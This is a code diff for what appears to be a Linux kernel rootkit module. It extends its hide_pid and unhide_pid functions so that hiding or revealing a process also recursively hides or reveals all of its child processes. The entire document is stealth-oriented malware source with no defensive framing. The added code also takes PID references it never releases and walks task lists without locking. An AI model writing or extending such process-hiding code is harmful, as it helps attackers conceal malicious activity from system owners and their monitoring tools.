@@ -49,8 +49,21 @@ unhide_pids(void)
 void
 hide_pid(pid_t pid)
 {
+    struct pid *spid;
+    struct task_struct *task;
+
     if (list_contains_pid(&hidden_pids, pid))
         return;
+
+    if (!(spid = find_get_pid(pid)) || !(task = pid_task(spid, PIDTYPE_PID)))
+        return;
+
+    struct list_head *i;
+    list_for_each(i, &task->children) {
+        struct task_struct *child = list_entry(i, struct task_struct, sibling);
+
+        hide_pid(child->pid);
+    }
 
     add_pid_to_list(hidden_pids_tail, pid);
 }
@@ -58,12 +71,25 @@ hide_pid(pid_t pid)
 void
 unhide_pid(pid_t pid)
 {
+    struct pid *spid;
+    struct task_struct *task;
+
     pid_list_t_ptr node;
     if (!(node = find_pid_in_list(&hidden_pids, pid)))
         return;
 
     if (node == &hidden_pids)
         return;
+
+    if (!(spid = find_get_pid(pid)) || !(task = pid_task(spid, PIDTYPE_PID)))
+        return;
+
+    struct list_head *i;
+    list_for_each(i, &task->children) {
+        struct task_struct *child = list_entry(i, struct task_struct, sibling);
+
+        unhide_pid(child->pid);
+    }
 
     remove_pid_from_list(node, pid);
 }
